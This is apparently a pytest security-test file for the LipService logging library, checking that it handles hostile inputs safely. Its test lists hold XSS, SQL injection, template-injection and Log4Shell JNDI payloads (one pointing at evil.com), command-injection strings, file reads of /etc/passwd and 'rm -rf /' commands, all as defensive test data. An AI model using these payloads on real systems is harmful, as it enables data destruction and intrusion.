"""
Security testing and vulnerability assessment for LipService.

This module provides:
- Input validation testing
- Authentication security testing
- Data sanitization testing
- Injection attack testing
- Access control testing
"""

import asyncio
import json
import time
from typing import Any, Dict, List

import pytest
import structlog

from lipservice import configure_adaptive_logging, get_logger, shutdown
from lipservice.performance import get_signature_computer


class SecurityTester:
    """Security tester for LipService."""
    
    def __init__(self):
        self.vulnerabilities = []
        self.security_tests_passed = 0
        self.security_tests_failed = 0
    
    def add_vulnerability(self, test_name: str, description: str):
        """Add a discovered vulnerability."""
        self.vulnerabilities.append({
            'test': test_name,
            'description': description,
            'timestamp': time.time()
        })
        self.security_tests_failed += 1
    
    def add_success(self, test_name: str):
        """Add a successful security test."""
        self.security_tests_passed += 1
    
    def get_report(self) -> Dict[str, Any]:
        """Get security test report."""
        return {
            'vulnerabilities': self.vulnerabilities,
            'tests_passed': self.security_tests_passed,
            'tests_failed': self.security_tests_failed,
            'total_tests': self.security_tests_passed + self.security_tests_failed,
            'security_score': self.security_tests_passed / (self.security_tests_passed + self.security_tests_failed) if (self.security_tests_passed + self.security_tests_failed) > 0 else 0
        }


class TestInputValidation:
    """Input validation security tests."""
    
    @pytest.mark.asyncio
    async def test_malicious_input_handling(self):
        """Test handling of malicious input."""
        security_tester = SecurityTester()
        
        configure_adaptive_logging(
            service_name='security-test',
            lipservice_url='http://localhost:8000',
        )

        logger = get_logger('security-test')
        
        # Test various malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE logs; --",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "eval('malicious_code')",
            "exec('import os; os.system(\"rm -rf /\")')",
            "import subprocess; subprocess.call(['rm', '-rf', '/'])",
        ]
        
        for malicious_input in malicious_inputs:
            try:
                # Test in message
                logger.info(f"Test message with malicious input: {malicious_input}")
                
                # Test in attributes
                logger.info("Test message", malicious_data=malicious_input)
                
                # Test signature computation
                computer = get_signature_computer()
                signature = computer.compute_signature(malicious_input)
                
                # Should not crash or execute malicious code
                assert isinstance(signature, str)
                assert len(signature) == 32  # MD5 hash length
                
                security_tester.add_success("malicious_input_handling")
                
            except Exception as e:
                security_tester.add_vulnerability(
                    "malicious_input_handling",
                    f"Failed to handle malicious input safely: {str(e)}"
                )
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8  # At least 80% security score

    @pytest.mark.asyncio
    async def test_large_input_handling(self):
        """Test handling of extremely large inputs."""
        security_tester = SecurityTester()
        
        configure_adaptive_logging(
            service_name='large-input-test',
            lipservice_url='http://localhost:8000',
        )

        logger = get_logger('large-input-test')
        
        # Test with very large inputs
        large_inputs = [
            "x" * 1000000,  # 1MB string
            "x" * 10000000,  # 10MB string
            json.dumps({"data": "x" * 1000000}),  # Large JSON
        ]
        
        for large_input in large_inputs:
            try:
                # Test signature computation with large input
                computer = get_signature_computer()
                signature = computer.compute_signature(large_input)
                
                # Should handle large input gracefully
                assert isinstance(signature, str)
                assert len(signature) == 32
                
                security_tester.add_success("large_input_handling")
                
            except Exception as e:
                security_tester.add_vulnerability(
                    "large_input_handling",
                    f"Failed to handle large input safely: {str(e)}"
                )
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8

    @pytest.mark.asyncio
    async def test_special_character_handling(self):
        """Test handling of special characters."""
        security_tester = SecurityTester()
        
        configure_adaptive_logging(
            service_name='special-chars-test',
            lipservice_url='http://localhost:8000',
        )

        logger = get_logger('special-chars-test')
        
        # Test various special characters
        special_chars = [
            "\x00\x01\x02\x03\x04\x05",  # Null bytes and control characters
            "🚀🎉💻🔥",  # Unicode emojis
            "ñáéíóú",  # Accented characters
            "中文测试",  # Chinese characters
            "العربية",  # Arabic characters
            "Русский",  # Cyrillic characters
            "עברית",  # Hebrew characters
        ]
        
        for special_chars_input in special_chars:
            try:
                # Test signature computation
                computer = get_signature_computer()
                signature = computer.compute_signature(special_chars_input)
                
                # Should handle special characters safely
                assert isinstance(signature, str)
                assert len(signature) == 32
                
                security_tester.add_success("special_character_handling")
                
            except Exception as e:
                security_tester.add_vulnerability(
                    "special_character_handling",
                    f"Failed to handle special characters safely: {str(e)}"
                )
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8


class TestAuthenticationSecurity:
    """Authentication security tests."""
    
    @pytest.mark.asyncio
    async def test_api_key_security(self):
        """Test API key security."""
        security_tester = SecurityTester()
        
        # Test with various API key formats
        api_keys = [
            "phc_valid_key_12345",
            "invalid_key",
            "",
            "phc_" + "x" * 1000,  # Very long key
            "phc_" + "x" * 10 + "\x00" + "y" * 10,  # Key with null bytes
        ]
        
        for api_key in api_keys:
            try:
                configure_adaptive_logging(
                    service_name='api-key-test',
                    lipservice_url='http://localhost:8000',
                    api_key=api_key,
                )
                
                logger = get_logger('api-key-test')
                logger.info("API key test", api_key_length=len(api_key))
                
                security_tester.add_success("api_key_security")
                
            except Exception as e:
                # Some invalid keys should cause errors
                if api_key == "" or "invalid" in api_key:
                    security_tester.add_success("api_key_security")
                else:
                    security_tester.add_vulnerability(
                        "api_key_security",
                        f"Unexpected error with API key: {str(e)}"
                    )
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8

    @pytest.mark.asyncio
    async def test_posthog_credentials_security(self):
        """Test PostHog credentials security."""
        security_tester = SecurityTester()
        
        # Test with various PostHog credentials
        credentials = [
            ("phc_valid_key", "12345"),
            ("invalid_key", "12345"),
            ("phc_valid_key", "invalid_team"),
            ("", ""),
            ("phc_" + "x" * 1000, "12345"),  # Very long key
        ]
        
        for api_key, team_id in credentials:
            try:
                configure_adaptive_logging(
                    service_name='posthog-credentials-test',
                    lipservice_url='http://localhost:8000',
                    posthog_api_key=api_key,
                    posthog_team_id=team_id,
                )
                
                logger = get_logger('posthog-credentials-test')
                logger.info("PostHog credentials test", api_key_length=len(api_key), team_id=team_id)
                
                security_tester.add_success("posthog_credentials_security")
                
            except Exception as e:
                # Some invalid credentials should cause errors
                if api_key == "" or "invalid" in api_key:
                    security_tester.add_success("posthog_credentials_security")
                else:
                    security_tester.add_vulnerability(
                        "posthog_credentials_security",
                        f"Unexpected error with PostHog credentials: {str(e)}"
                    )
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8


class TestDataSanitization:
    """Data sanitization security tests."""
    
    @pytest.mark.asyncio
    async def test_log_data_sanitization(self):
        """Test that log data is properly sanitized."""
        security_tester = SecurityTester()
        
        configure_adaptive_logging(
            service_name='data-sanitization-test',
            lipservice_url='http://localhost:8000',
        )

        logger = get_logger('data-sanitization-test')
        
        # Test data that should be sanitized
        sensitive_data = [
            "password=secret123",
            "api_key=sk-1234567890abcdef",
            "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
            "credit_card=4111-1111-1111-1111",
            "ssn=123-45-6789",
            "email=user@example.com",
        ]
        
        for sensitive_input in sensitive_data:
            try:
                # Test signature computation
                computer = get_signature_computer()
                signature = computer.compute_signature(sensitive_input)
                
                # Signature should not contain sensitive data
                assert sensitive_input not in signature
                assert isinstance(signature, str)
                assert len(signature) == 32
                
                security_tester.add_success("log_data_sanitization")
                
            except Exception as e:
                security_tester.add_vulnerability(
                    "log_data_sanitization",
                    f"Failed to sanitize log data: {str(e)}"
                )
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8

    @pytest.mark.asyncio
    async def test_pattern_normalization_security(self):
        """Test that pattern normalization is secure."""
        security_tester = SecurityTester()
        
        computer = get_signature_computer()
        
        # Test that similar patterns produce same signature
        test_cases = [
            ("User 123 logged in", "User 456 logged in"),
            ("IP 192.168.1.1", "IP 10.0.0.1"),
            ("Email user@example.com", "Email admin@company.com"),
            ("UUID 550e8400-e29b-41d4-a716-446655440000", "UUID 6ba7b810-9dad-11d1-80b4-00c04fd430c8"),
        ]
        
        for pattern1, pattern2 in test_cases:
            try:
                sig1 = computer.compute_signature(pattern1)
                sig2 = computer.compute_signature(pattern2)
                
                # Similar patterns should produce same signature
                assert sig1 == sig2
                
                security_tester.add_success("pattern_normalization_security")
                
            except Exception as e:
                security_tester.add_vulnerability(
                    "pattern_normalization_security",
                    f"Pattern normalization failed: {str(e)}"
                )
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8


class TestInjectionAttacks:
    """Injection attack tests."""
    
    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks."""
        security_tester = SecurityTester()
        
        configure_adaptive_logging(
            service_name='sql-injection-test',
            lipservice_url='http://localhost:8000',
        )

        logger = get_logger('sql-injection-test')
        
        # Test SQL injection attempts
        sql_injections = [
            "'; DROP TABLE logs; --",
            "' OR '1'='1",
            "'; INSERT INTO logs VALUES ('hacked'); --",
            "' UNION SELECT * FROM users --",
            "'; UPDATE logs SET message='hacked'; --",
        ]
        
        for sql_injection in sql_injections:
            try:
                # Test signature computation
                computer = get_signature_computer()
                signature = computer.compute_signature(sql_injection)
                
                # Should not execute SQL
                assert isinstance(signature, str)
                assert len(signature) == 32
                
                security_tester.add_success("sql_injection_prevention")
                
            except Exception as e:
                security_tester.add_vulnerability(
                    "sql_injection_prevention",
                    f"SQL injection not prevented: {str(e)}"
                )
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        security_tester = SecurityTester()
        
        configure_adaptive_logging(
            service_name='command-injection-test',
            lipservice_url='http://localhost:8000',
        )

        logger = get_logger('command-injection-test')
        
        # Test command injection attempts
        command_injections = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(whoami)",
            "exec('import os; os.system(\"rm -rf /\")')",
        ]
        
        for command_injection in command_injections:
            try:
                # Test signature computation
                computer = get_signature_computer()
                signature = computer.compute_signature(command_injection)
                
                # Should not execute commands
                assert isinstance(signature, str)
                assert len(signature) == 32
                
                security_tester.add_success("command_injection_prevention")
                
            except Exception as e:
                security_tester.add_vulnerability(
                    "command_injection_prevention",
                    f"Command injection not prevented: {str(e)}"
                )
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8


class TestAccessControl:
    """Access control security tests."""
    
    @pytest.mark.asyncio
    async def test_unauthorized_access_prevention(self):
        """Test prevention of unauthorized access."""
        security_tester = SecurityTester()
        
        # Test with invalid URLs
        invalid_urls = [
            "http://localhost:9999",  # Invalid port
            "https://evil.com",  # External URL
            "file:///etc/passwd",  # File URL
            "ftp://evil.com",  # FTP URL
        ]
        
        for invalid_url in invalid_urls:
            try:
                configure_adaptive_logging(
                    service_name='unauthorized-access-test',
                    lipservice_url=invalid_url,
                )
                
                logger = get_logger('unauthorized-access-test')
                logger.info("Unauthorized access test", url=invalid_url)
                
                # Should not crash, but may fail gracefully
                security_tester.add_success("unauthorized_access_prevention")
                
            except Exception as e:
                # Some invalid URLs should cause errors
                security_tester.add_success("unauthorized_access_prevention")
        
        await shutdown()
        
        # Check security report
        report = security_tester.get_report()
        assert report['security_score'] > 0.8


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])
